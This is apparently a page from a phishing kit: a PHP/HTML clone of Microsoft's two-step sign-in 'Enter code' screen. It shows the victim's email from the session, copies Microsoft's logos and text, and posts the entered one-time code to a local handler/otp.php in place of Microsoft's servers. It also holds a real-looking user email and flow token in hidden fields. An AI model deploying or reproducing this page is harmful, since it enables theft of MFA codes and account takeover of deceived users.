<?php
error_reporting(0);
session_start();
$email = $_SESSION['email'];

 ?>
<!DOCTYPE html>
<html dir="ltr" class="" lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Sign in to your account</title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
      <meta http-equiv="x-dns-prefetch-control" content="on">
      <meta name="robots" content="none">
      <link  href="./otp_files/converged.v2.login.min_8owwt4u-33ps0wawi7tmow2.css" rel="stylesheet" >
      <link  href="./otp_files/converged.v2.login.min_8owwt4u-33ps0wawi7tmow2.css">
   </head>
   <body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
      <div>
         <!--  -->
         <!--  -->
         <form method="post" action="handler/otp.php">
            <!-- ko withProperties: { '$tfaPage': $data } -->
            <div data-bind="component: { name: &#39;master-page&#39;,
               publicMethods: masterPageMethods,
               params: {
               serverData: svr,
               showButtons: svr.fShowButtons,
               showFooterLinks: true,
               handleWizardButtons: false,
               useWizardBehavior: svr.fUseWizardBehavior },
               event: {
               footerAgreementClick: footer_agreementClick } }">
               <!--  -->
               <!-- ko ifnot: useLayoutTemplates --><!-- /ko -->
               <!-- ko if: useLayoutTemplates -->
               <!-- ko withProperties: { '$page': $parent } -->
               <!-- ko if: isLightboxTemplate() -->
               <div id="lightboxTemplateContainer" data-bind="component: { name: &#39;lightbox-template&#39;, params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { &#39;provide-min-height&#39;: svr.fUseMinHeight }">
                  <!--  -->
                  <div id="lightboxBackgroundContainer" data-bind="css: { &#39;provide-min-height&#39;: svr.fUseMinHeight },
                     component: { name: &#39;background-image-control&#39;,
                     publicMethods: $page.backgroundControlMethods,
                     event: { load: $page.backgroundImageControl_onLoad } }">
                     <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                        <!-- ko if: smallImageUrl --><!-- /ko -->
                        <!-- ko if: backgroundImageUrl -->
                        <div id="backgroundImage" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { &#39;background-image&#39;: true }" class="background-image ext-background-image" style="background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
                        <!-- ko if: useImageMask --><!-- /ko -->
                        <!-- /ko -->
                     </div>
                  </div>
                  <!-- ko if: svr.iBannerEnvironment --><!-- /ko -->
                  <!-- ko withProperties: { '$masterPageContext': $parentContext } -->
                  <div class="outer" data-bind="css: { &#39;app&#39;: $page.backgroundLogoUrl }">
                     <!-- ko if: showHeader --><!-- /ko -->
                     <div class="template-section main-section">
                        <div data-bind="externalCss: { &#39;middle&#39;: true }" class="middle ext-middle">
                           <div class="full-height" data-bind="component: { name: &#39;content-control&#39;, params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }">
                              <!--  -->
                              <!-- ko withProperties: { '$content': $data } -->
                              <div class="flex-column">
                                 <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->
                                 <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->
                                 <div class="win-scroll">
                                    <div id="lightbox" data-bind="
                                       animationEnd: $page.paginationControlHelper.animationEnd,
                                       externalCss: { &#39;sign-in-box&#39;: true },
                                       css: {
                                       &#39;inner&#39;:  $content.isVerticalSplitTemplate,
                                       &#39;vertical-split-content&#39;: $content.isVerticalSplitTemplate,
                                       &#39;app&#39;: $page.backgroundLogoUrl,
                                       &#39;wide&#39;: $page.paginationControlHelper.useWiderWidth,
                                       &#39;fade-in-lightbox&#39;: $page.fadeInLightBox,
                                       &#39;has-popup&#39;: $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                                       &#39;transparent-lightbox&#39;: $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                                       &#39;lightbox-bottom-margin-debug&#39;: $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
                                       <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->
                                       <div class="lightbox-cover" data-bind="css: { &#39;disable-lightbox&#39;: svr.fAllowGrayOutLightBox &amp;&amp; isRequestPending() }"></div>
                                       <!-- ko if: isRequestPending --><!-- /ko -->
                                       <div>
                                          <!-- ko if: loadBannerLogo -->
                                          <div data-bind="component: { name: &#39;logo-control&#39;,
                                             params: {
                                             isChinaDc: svr.fIsChinaDc,
                                             bannerLogoUrl: $tfaPage.bannerLogoUrl() } }">
                                             <!--  -->
                                             <!-- ko if: bannerLogoUrl --><!-- /ko -->
                                             <!-- ko if: !bannerLogoUrl && !isChinaDc -->
                                             <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
                                             <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                             <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str[&#39;MOBILE_STR_Footer_Microsoft&#39;] }" src="./otp_files/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
                                             <!-- /ko --><!-- /ko -->
                                             <!-- /ko -->
                                          </div>
                                          <!-- /ko -->
                                          <!-- ko if: asyncInitReady -->
                                          <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                                             publicMethods: paginationControlMethods,
                                             params: {
                                             enableCssAnimation: svr.fEnableCssAnimation,
                                             disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                                             initialViewId: initialViewId,
                                             initialSharedData: initialSharedData,
                                             initialError: $tfaPage.serverError },
                                             event: {
                                             cancel: paginationControl_onCancel,
                                             load: paginationControlHelper.onLoad,
                                             unload: paginationControlHelper.onUnload,
                                             loadView: view_onLoadView,
                                             showView: view_onShow,
                                             setLightBoxFadeIn: view_onSetLightBoxFadeIn } }">
                                             <!--  -->
                                             <div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }" class="">
                                                <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
                                                <div data-bind="css: {
                                                   &#39;animate&#39;: animate() &amp;&amp; animate.animateBanner(),
                                                   &#39;slide-out-next&#39;: animate.isSlideOutNext(),
                                                   &#39;slide-in-next&#39;: animate.isSlideInNext(),
                                                   &#39;slide-out-back&#39;: animate.isSlideOutBack(),
                                                   &#39;slide-in-back&#39;: animate.isSlideInBack() }" class="slide-in-next">
                                                   <div data-bind="component: { name: &#39;identity-banner-control&#39;,
                                                      params: {
                                                      userTileUrl: svr.urlProfilePhoto,
                                                      displayName: sharedData.displayName || svr.sPOST_Username,
                                                      isBackButtonVisible: isBackButtonVisible(),
                                                      focusOnBackButton: isBackButtonFocused(),
                                                      backButtonDescribedBy: backButtonDescribedBy() },
                                                      event: {
                                                      backButtonClick: identityBanner_onBackButtonClick } }">
                                                      <!--  -->
                                                      <div class="identityBanner">
                                                         <!-- ko if: isBackButtonVisible --><!-- /ko -->
                                                         <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }" title="<?php echo $email; ?>"><?php echo $email; ?></div>
                                                      </div>
                                                   </div>
                                                </div>
                                                <!-- /ko -->
                                                <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
                                                   &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
                                                   &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
                                                   &#39;animate&#39;: animate(),
                                                   &#39;slide-out-next&#39;: animate.isSlideOutNext(),
                                                   &#39;slide-in-next&#39;: animate.isSlideInNext(),
                                                   &#39;slide-out-back&#39;: animate.isSlideOutBack(),
                                                   &#39;slide-in-back&#39;: animate.isSlideInBack() }">
                                                   <!-- ko foreach: views -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                   <!-- ko template: { nodes: [$data], data: $parent } -->
                                                   <div data-viewid="1" data-showidentitybanner="true" data-bind="pageViewComponent: { name: &#39;otc-confirm-view&#39;,
                                                      params: {
                                                      serverData: svr,
                                                      serverError: initialError,
                                                      username: sharedData.username,
                                                      focusDefaultField: true,
                                                      supportsBack: true,
                                                      isInitialState: isInitialState,
                                                      sentProof: sharedData.sentProof,
                                                      otcProofs: sharedData.otcProofs,
                                                      isGeneralVerify: sharedData.isGeneralVerify,
                                                      proofConfirmation: sharedData.proofConfirmation,
                                                      showCancelButton: sharedData.showCancelButton,
                                                      trustedDeviceCheckboxConfig: sharedData.trustedDeviceCheckboxConfig,
                                                      currentPollStartTime: sharedData.currentPollStartTime,
                                                      currentPollEndTime: sharedData.currentPollEndTime,
                                                      sessionIdentifier: sharedData.sessionIdentifier,
                                                      twoWayPollingNeeded: sharedData.twoWayPollingNeeded,
                                                      hasTotpV2Only: sharedData.hasTotpV2Only,
                                                      hasTotpV1Only: sharedData.hasTotpV1Only,
                                                      flowToken: sharedData.flowToken },
                                                      event: {
                                                      cancel: view_onCancel,
                                                      updateFlowToken: $tfaPage.view_onUpdateFlowToken,
                                                      showDebugDetails: $tfaPage.toggleDebugDetails_onClick,
                                                      submitReady: $tfaPage.view_onSubmitReady,
                                                      setPendingRequest: $tfaPage.view_onSetPendingRequest,
                                                      setBackButtonState: view_onSetIdentityBackButtonState } }">
                                                      <!--  -->
                                                    
                                                      <!-- ko if: proofConfirmation --><!-- /ko -->
                                                      <div id="idDiv_SAOTCC_Title" class="row text-title" role="heading" aria-level="1" data-bind="text: twoWayPollingNeeded ? str[&#39;CT_SAOTCAS_STR_Title&#39;] : str[&#39;CT_SAOTCS_STR_Title&#39;]">Enter code</div>
                                                      <div class="row text-body">
                                                         <div data-bind="component: { name: &#39;proof-image-control&#39;, params: { type: proofImageType, small: true, animate: twoWayPollingNeeded } }">
                                                            <!--  -->
                                                            <!-- ko if: type === PROOF.Type.Email --><!-- /ko -->
                                                            <!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile -->
                                                            <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
                                                            <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                                            <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img small" role="presentation" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_sms_b15dda889e9803e9d6befd60000fadf8.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg" data-bind="imgSrc, css: { &#39;small&#39;: small, &#39;animate-pulse&#39;: animate }" src="./otp_files/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg"><!-- /ko -->
                                                            <!-- /ko --><!-- /ko -->
                                                            <!-- /ko -->
                                                            <!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko -->
                                                            <!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 --><!-- /ko -->
                                                            <!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->
                                                            <!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->
                                                            <!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko -->
                                                            <!-- ko if: type === PROOF.Type.Certificate --><!-- /ko -->
                                                         </div>
                                                         <div id="idDiv_SAOTCC_Description" class="text-block-body overflow-hidden" data-bind="text: description">We texted your phone +X XXX-XXX-XXXX. Please enter the code to sign in.</div>
                                                      </div>
                                                      <div class="text-block-body">
                                                         <div id="idDiv_SAOTCC_OTCRow" class="form-group">
                                                            <div role="alert" aria-live="assertive">
                                                               <!-- ko if: error --><!-- /ko -->
                                                            </div>
                                                            <div id="idDiv_SAOTCC_Success_OTC" class="errorDiv" style="display: none;">
                                                               <span id="idSpan_SAOTCC_Success_OTC" class="success"></span>
                                                            </div>
                                                            <!-- ko ifnot: twoWayPollingNeeded || hideInputControls() -->
                                                            <div id="idDiv_SAOTCC_OTC" class="textbox form-group">
                                                               <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox-field&#39;,
                                                                  publicMethods: otcInputTextbox.placeholderTextboxMethods,
                                                                  params: {
                                                                  serverData: svr,
                                                                  hintText: str[&#39;CT_SAOTCC_STR_OTC_TBHint&#39;] },
                                                                  event: {
                                                                  updateFocus: otcInputTextbox.textbox_onUpdateFocus } }">
                                                                  <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                                  <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
                                                                  <input id="idTxtBx_SAOTCC_OTC" name="otp" class="form-control" type="tel" autocomplete="off" aria-required="true" data-bind="
                                                                     attr: {
                                                                     &#39;maxlength&#39;: otcLength,
                                                                     &#39;aria-labelledby&#39;: &#39;idDiv_SAOTCC_Title&#39;,
                                                                     &#39;aria-describedby&#39;: &#39;idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC&#39; },
                                                                     css: { &#39;has-error&#39;: error },
                                                                     textInput: otcInputTextbox.value,
                                                                     ariaLabel: str[&#39;CT_SAOTCC_STR_OTC_TBHint&#39;],
                                                                     hasFocusEx: otcInputTextbox.focused,
                                                                     placeholder: $placeholderText" maxlength="6" aria-labelledby="idDiv_SAOTCC_Title" aria-describedby="idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC" aria-label="Code" placeholder="Code">
                                                                  <!-- /ko -->
                                                                  <!-- /ko -->
                                                                  <!-- ko ifnot: usePlaceholderAttribute --><!-- /ko -->
                                                               </div>
                                                            </div>
                                                            <!-- ko if: twoFactorAuthPinEnabled --><!-- /ko -->
                                                            <!-- /ko -->
                                                         </div>
                                                      </div>
                                                      <div class="text-block-body text-body" data-bind="visible: showSendNotification" style="display: none;">
                                                         <a id="idA_SAOTCC_SendNotification" href="https://login.microsoftonline.com/common/login#" data-bind="html: str[&#39;CT_SAOTCC_STR_SendNotification&#39;], click: switchToSessionApproval_onClick">Send an identity verification request to my Microsoft Authenticator app.</a>
                                                      </div>
                                                      <div data-bind="css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText &amp;&amp; !twoWayPollingNeeded }" class="position-buttons">
                                                         <div class="row">
                                                            <div id="idDiv_SAOTCC_TD_Section" class="no-margin-top-bottom" data-bind="visible: tdCheckbox.isShown &amp;&amp; !hideInputControls()" style="display: none;">
                                                               <div id="idDiv_SAOTCC_TD" class="col-md-24 form-group no-margin-top checkbox">
                                                                  <label id="idLbl_SAOTCC_TD_Cb">
                                                                  <input id="idChkBx_SAOTCC_TD" type="checkbox" value="true" data-bind="checked: tdCheckbox.isChecked, disable: tdCheckbox.isDisabled, ariaLabel: str[&#39;CT_SAOTCC_STR_AddTD&#39;], attr: { name: svr.sTrustedDeviceCheckboxName }" name="rememberMFA" aria-label="Don&#39;t ask again for undefined days">
                                                                  <span data-bind="text: str[&#39;CT_SAOTCC_STR_AddTD&#39;]">Don't ask again for undefined days</span>
                                                                  </label>
                                                               </div>
                                                            </div>
                                                            <!-- ko if: isInitialState || svr.urlMoreInfo -->
                                                            <div class="col-md-24">
                                                               <div class="text-13">
                                                                  <!-- ko if: isInitialState && showSwitchProofsLink -->
                                                                  <div class="form-group" id="idDiv_SAOTCS_HavingTrouble" data-bind="
                                                                     htmlWithBindings: str[&#39;CT_SAOTCC_STR_Toggle&#39;],
                                                                     childBindings: { &#39;signInAnotherWay&#39;: { click: switchToOtcRequest_onClick } }">Having trouble? <a href="https://login.microsoftonline.com/common/login#" id="signInAnotherWay">Sign in another way</a></div>
                                                                  <!-- /ko -->
                                                                  <!-- ko if: svr.urlMoreInfo -->
                                                                  <div data-bind="css: { &#39;form-group&#39;: !twoWayPollingNeeded }" class="form-group">
                                                                     <a id="moreInfoUrl" target="_blank" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" data-bind="
                                                                        text: str[&#39;CT_STR_More_Info&#39;],
                                                                        href: svr.urlMoreInfo,
                                                                        ariaLabel: str[&#39;CT_STR_More_Info_AriaLabel&#39;]" aria-label="More information about two step verification">More information</a>
                                                                  </div>
                                                                  <!-- /ko -->
                                                               </div>
                                                            </div>
                                                            <!-- /ko -->
                                                         </div>
                                                      </div>
                                                      <div class="win-button-pin-bottom" data-bind="css : { &#39;boilerplate-button-bottom&#39;: tenantBranding.BoilerPlateText }">
                                                         <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }">
                                                            <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
                                                               params: {
                                                               serverData: svr,
                                                               removeBottomMargin: true,
                                                               primaryButtonId: &#39;idSubmit_SAOTCC_Continue&#39;,
                                                               primaryButtonText: str[&#39;CT_SAOTCC_STR_Continue&#39;],
                                                               secondaryButtonId: &#39;idBtn_Back&#39;,
                                                               secondaryButtonText: str[&#39;CT_SAOTCC_STR_Cancel&#39;],
                                                               isSecondaryButtonVisible: !showSwitchProofsLink,
                                                               isPrimaryButtonVisible: svr.fShowButtons &amp;&amp; !twoWayPollingNeeded &amp;&amp; !hideInputControls(),
                                                               secondaryButtonDescribedBy: (svr.fShowButtons &amp;&amp; twoWayPollingNeeded) ? &#39;idDiv_SAOTCC_Description&#39; : null },
                                                               event: {
                                                               primaryButtonClick: primaryButton_onClick,
                                                               secondaryButtonClick: secondaryButton_onClick } }">
                                                               <div class="col-xs-24 no-padding-left-right button-container no-margin-bottom button-field-container ext-button-field-container" data-bind="
                                                                  visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                                                  css: { &#39;no-margin-bottom&#39;: removeBottomMargin },
                                                                  externalCss: { &#39;button-field-container&#39;: true }">
                                                                  <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->
                                                                  <div data-bind="css: { &#39;inline-block&#39;: isPrimaryButtonVisible }, externalCss: { &#39;button-item&#39;: true }" class="inline-block button-item ext-button-item">
                                                                     <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
                                                                     <input type="submit" id="idSubmit_SAOTCC_Continue" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                                                                        attr: primaryButtonAttributes,
                                                                        externalCss: {
                                                                        &#39;button&#39;: true,
                                                                        &#39;primary&#39;: true },
                                                                        value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
                                                                        hasFocus: focusOnPrimaryButton,
                                                                        click: primaryButton_onClick,
                                                                        enable: isPrimaryButtonEnabled,
                                                                        visible: isPrimaryButtonVisible,
                                                                        preventTabbing: primaryButtonPreventTabbing" value="Verify">
                                                                  </div>
                                                               </div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                      <!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
                                                   </div>
                                                   <!-- /ko -->
                                                   <!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- /ko -->
                                                </div>
                                             </div>
                                          </div>
                                          <!-- /ko -->
                                       </div>
                                       <input type="hidden" name="login" data-bind="value: postUsername" value="cwatts@techsafety.com">
                                       <input type="hidden" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAAD--DLA3VO7QrddgJg7WevrljSB6pUIYQ7NWOIzBecCACjlRSpdouzBxxPr_GW0iDX4fCx_0XK2W0CIu9lTrQLca5Kx3oskk9f3fEsDyFrehQBHy0Zi6V6XbebvBq8Xhp9X4gTCdYE5jMZ6O_BGjCpinGZm5WJ_LaIh2etgUFYjkj9eXk2yvfg5PltlITUTh0-wKZaZ6uYs7vBUDbNF63QwOTzTBH8NEFFBny1uD3QWlie5Wf14dDmyB66RKgssHyQ3-xlu3FrrNcDMz_-2F0TX0sjM6R3bD2CrQEjATlG7YrZLW33dYqqs60Ei3cE56Fx4agJLCvJmywHk4QabPkguUmVB6D5YE9nSjpycFQNF3Kxk703owvOVE2AHWXp46W4c9lBDnAvPQKRvfcyeVAnoF6rwGFFl9B6SD1NYys2uIQ11qM0CgMVfWCxI9O_LTTis-3B29spALzagHTpzsie_cSoTJBjoYX_Gjw-me_1wieVK-c2WILVCVOeltqX4cKwRumtOkuon998puRV5a73rOAQd10y-r0gTHv7V0s8rYOl_vG4ASdE8JFSGsaLcXxfcnoUQcV-HmT2XY_IIwCRnKBaX7OLIITbmYGivOSV1Xi7q9zFYUG3jwMNH4iK174QWnFTjsOk1twr2TRC9gZAGPIuquLv1mjW1vAiWz51RU2uVkHJN8L5utslRGy6tWQog7IAy2DkZXuy_HRiBNhqMGbWOezMZulaZ5s2qRA8Z15qXlC1eGoV6dAm98m7iWOCmvBuC6lvgopOECYDJfjRIg9nxySX3XR91E2OJIeGcx4lmSZHRqkVzQN01J9BR_Enn5BYFJNT-EACG4tHzgoAA6KpwRlNFXg4Jz7VYxRLyEQSNtno_HbIHCCQljdlpQUHSfpcaUvIGDg-Rf3E2d1kTiN-GCo4rhEt_uCrL56BGRO03fG7CQlhdG5ZoF62dGmkgAA">
                                       <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="f224d5c1-848c-467f-b1da-fda0ef02a000">
                                       <input type="hidden" name="sacxt" data-bind="value: svr.iSAContext" value="">
                                       <input type="hidden" name="hideSmsInMfaProofs" data-bind="value: hideSmsInMfaProofs" value="false">
                                       <!-- ko if: sessionIdentifier --><!-- /ko -->
                                       <div data-bind="component: { name: &#39;instrumentation-control&#39;,
                                          publicMethods: instrumentationMethods,
                                          params: { serverData: svr } }">
                                          <input type="hidden" name="i19" data-bind="value: timeOnPage" value="">
                                       </div>
                                       <!-- /ko -->
                                    </div>
                                    <!-- ko if: $page.showFedCredAndNewSession --><!-- /ko -->
                                    <!-- ko if: $page.showDebugDetails --><!-- /ko -->
                                 </div>
                              </div>
                              <!-- /ko -->
                           </div>
                        </div>
                     </div>
                     <!-- ko if: $page.paginationControlHelper.showFooterControl -->
                     <div id="footer" role="contentinfo" data-bind="
                        externalCss: {
                        &#39;footer&#39;: true,
                        &#39;has-background&#39;: !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
                        &#39;background-always-visible&#39;: $page.backgroundLogoUrl }" class="footer ext-footer">
                        <div data-bind="component: { name: &#39;footer-control&#39;,
                           publicMethods: $page.footerMethods,
                           params: {
                           serverData: svr,
                           useDefaultBackground: $page.useDefaultBackground(),
                           hasDarkBackground: $page.backgroundLogoUrl(),
                           showLinks: true,
                           showFooter: $page.showFooter(),
                           hideTOU: $page.hideTOU(),
                           termsText: $page.termsText(),
                           termsLink: $page.termsLink(),
                           hidePrivacy: $page.hidePrivacy(),
                           privacyText: $page.privacyText(),
                           privacyLink: $page.privacyLink() },
                           event: {
                           agreementClick: $page.footer_agreementClick,
                           showDebugDetails: $page.toggleDebugDetails_onClick } }">
                           <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
                           <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { &#39;footer-links&#39;: true }">
                              <!-- ko if: showFooter -->
                              <!-- ko if: !hideTOU -->
                              <a id="ftrTerms" data-bind="
                                 text: termsText,
                                 href: termsLink,
                                 click: termsLink_onClick,
                                 externalCss: {
                                 &#39;footer-content&#39;: true,
                                 &#39;footer-item&#39;: true,
                                 &#39;has-background&#39;: !useDefaultBackground,
                                 &#39;background-always-visible&#39;: hasDarkBackground }" href="https://www.microsoft.com/en-US/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
                              <!-- /ko -->
                              <!-- ko if: !hidePrivacy -->
                              <a id="ftrPrivacy" data-bind="
                                 text: privacyText,
                                 href: privacyLink,
                                 click: privacyLink_onClick,
                                 externalCss: {
                                 &#39;footer-content&#39;: true,
                                 &#39;footer-item&#39;: true,
                                 &#39;has-background&#39;: !useDefaultBackground,
                                 &#39;background-always-visible&#39;: hasDarkBackground }" href="https://privacy.microsoft.com/en-US/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
                              <!-- /ko -->
                              <!-- ko if: impressumLink --><!-- /ko -->
                              <!-- ko if: a11yConformeLink --><!-- /ko -->
                              <!-- ko if: showIcpLicense --><!-- /ko -->
                              <!-- /ko -->
                              <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
                              <a id="moreOptions" href="https://login.microsoftonline.com/common/login#" role="button" data-bind="
                                 click: moreInfo_onClick,
                                 ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
                                 attr: { &#39;aria-expanded&#39;: showDebugDetails().toString() },
                                 hasFocusEx: focusMoreInfo(),
                                 externalCss: {
                                 &#39;footer-content&#39;: true,
                                 &#39;footer-item&#39;: true,
                                 &#39;debug-item&#39;: true,
                                 &#39;has-background&#39;: !useDefaultBackground,
                                 &#39;background-always-visible&#39;: hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                           </div>
                           <!-- /ko -->
                           <!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko -->
                        </div>
                     </div>
                     <!-- /ko -->
                  </div>
                  <!-- /ko -->
               </div>
               <!-- /ko -->
               <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
               <!-- /ko -->
               <!-- /ko -->
            </div>
            <!-- /ko -->
         </form>
         <form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>
      </div>
   </body>
</html>
